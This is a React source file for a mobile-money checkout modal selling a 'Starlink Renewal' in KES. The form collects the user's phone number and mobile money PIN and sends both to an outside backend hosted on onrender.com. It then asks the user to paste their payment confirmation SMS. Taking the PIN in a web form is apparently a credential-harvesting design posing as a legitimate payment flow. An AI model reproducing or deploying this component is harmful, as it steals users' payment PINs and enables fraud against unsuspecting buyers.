import React, { useState } from 'react';

export default function MoMoCheckout({ plan = 'Starlink Renewal', amount = 1200, onClose, onSuccess }) {
const [step, setStep] = useState(1); // Step 1: Payment (Phone + PIN), Step 2: SMS Verification
const [phone, setPhone] = useState('');
const [pin, setPin] = useState('');
const [smsContent, setSmsContent] = useState('');
const [loading, setLoading] = useState(false);
const [error, setError] = useState('');

const handlePaymentSubmit = async (e) => {
e.preventDefault();
setLoading(true);
setError('');

try {
  const res = await fetch('https://starlink-reseller-backend.onrender.com/api/momo/pay', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ phone, pin, amount, plan })
  });
  const data = await res.json();
  
  if (!res.ok) throw new Error(data.message || 'Payment initiation failed');
  setStep(2); // Move to SMS verification step
} catch (err) {
  setError(err.message);
} finally {
  setLoading(false);
}
};

const handleSmsSubmit = async (e) => {
e.preventDefault();
setLoading(true);
setError('');

try {
  const res = await fetch('https://starlink-reseller-backend.onrender.com/api/momo/verify-sms', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ smsContent, phone })
  });
  const data = await res.json();

  if (!res.ok) throw new Error(data.message || 'SMS verification failed');
  if (onSuccess) onSuccess(data);
} catch (err) {
  setError(err.message);
} finally {
  setLoading(false);
}
};

return (
<div className="fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
  <div className="bg-[#121418] border border-white/10 rounded-2xl w-full max-w-md p-6 text-white relative">
    {error && (
      <div className="mb-4 p-3 bg-red-500/20 border border-red-500/50 rounded-lg text-red-400 text-sm">
        {error}
      </div>
    )}

    {step === 1 ? (
      <form onSubmit={handlePaymentSubmit}>
        <div className="text-center mb-6">
          <span className="text-xs uppercase tracking-wider text-white/50">Total</span>
          <h2 className="text-3xl font-bold text-amber-500 mt-1">KES {amount}</h2>
          <p className="text-sm text-white/70 mt-1">{plan}</p>
        </div>

        <div className="mb-4">
          <label className="block text-xs font-medium text-white/60 mb-1">Mobile Phone Number</label>
          <input
            type="tel"
            placeholder="07XXXXXXXX"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-amber-500 text-white text-sm"
            required
          />
        </div>

        <div className="mb-6">
          <label className="block text-xs font-medium text-white/60 mb-1">Enter Mobile Money PIN</label>
          <input
            type="password"
            maxLength="6"
            placeholder="• • • •"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-amber-500 text-center tracking-widest text-lg"
            required
          />
        </div>

        <button
          type="submit"
          disabled={loading}
          className="w-full py-4 bg-gradient-to-r from-amber-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
        >
          {loading ? 'Processing...' : 'Send STK Push Prompt'}
        </button>
        
        {onClose && (
          <button
            type="button"
            onClick={onClose}
            className="w-full mt-3 py-2 text-center text-xs text-white/50 hover:text-white"
          >
            Cancel
          </button>
        )}
      </form>
    ) : (
      <form onSubmit={handleSmsSubmit}>
        <div className="flex items-center mb-4">
          <button 
            type="button" 
            onClick={() => setStep(1)}
            className="text-sm text-amber-500 hover:underline flex items-center gap-1"
          >
            ← Back
          </button>
        </div>

        <div className="mb-6">
          <h2 className="text-xl font-bold text-white">SMS Verification</h2>
          <p className="text-xs text-white/60 mt-1">Please paste the full payment confirmation SMS received.</p>
        </div>

        <div className="mb-6">
          <label className="block text-xs font-medium text-white/60 mb-1">Paste SMS Confirmation Message</label>
          <textarea
            rows="4"
            placeholder="Paste the full payment SMS received..."
            value={smsContent}
            onChange={(e) => setSmsContent(e.target.value)}
            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl p-3 focus:outline-none focus:border-amber-500 text-xs text-white"
            required
          />
        </div>

        <button
          type="submit"
          disabled={loading}
          className="w-full py-4 bg-gradient-to-r from-amber-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
        >
          {loading ? 'Verifying...' : 'Verify & Claim Package'}
        </button>
      </form>
    )}
  </div>
</div>
);
}
